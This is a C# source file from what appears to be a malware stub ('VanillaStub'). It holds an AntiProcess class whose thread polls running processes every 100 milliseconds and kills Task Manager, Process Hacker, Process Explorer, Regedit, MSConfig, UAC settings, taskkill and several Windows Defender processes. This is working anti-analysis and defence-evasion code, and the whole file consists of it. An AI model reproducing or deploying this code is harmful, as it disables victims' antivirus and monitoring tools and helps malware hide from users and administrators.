using System.Diagnostics;
using System.Security.Permissions;
using System.Threading;

namespace VanillaStub.Helpers.Services
{
    internal class AntiProcess
    {
        private static Thread BlockThread = new Thread(Block);
        public static bool Enabled { get; set; }

        public static void StartBlock()
        {
            Enabled = true;
            BlockThread.Start();
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void StopBlock()
        {
            Enabled = false;
            try
            {
                BlockThread.Abort();
                BlockThread = new Thread(Block);
            }
            catch { }
        }

        private static void Block()
        {
            while (Enabled)
            {
                foreach (Process P in Process.GetProcesses())
                {
                    try
                    {
                        string ProcessName = P.ProcessName;
                        if (ProcessName.Equals("taskmgr") ||
                            ProcessName.Equals("ProcessHacker") ||
                            ProcessName.Equals("procexp") ||
                            ProcessName.Equals("MSASCui") ||
                            ProcessName.Equals("MsMpEng") ||
                            ProcessName.Equals("MpUXSrv") ||
                            ProcessName.Equals("MpCmdRun") ||
                            ProcessName.Equals("NisSrv") ||
                            ProcessName.Equals("ConfigSecurityPolicy") ||
                            ProcessName.Equals("MSConfig") ||
                            ProcessName.Equals("Regedit") ||
                            ProcessName.Equals("UserAccountControlSettings") ||
                            ProcessName.Equals("taskkill")
                        )
                        {
                            P.Kill();
                        }
                    }
                    catch { }
                }
                Thread.Sleep(100);
            }
        }
    }
}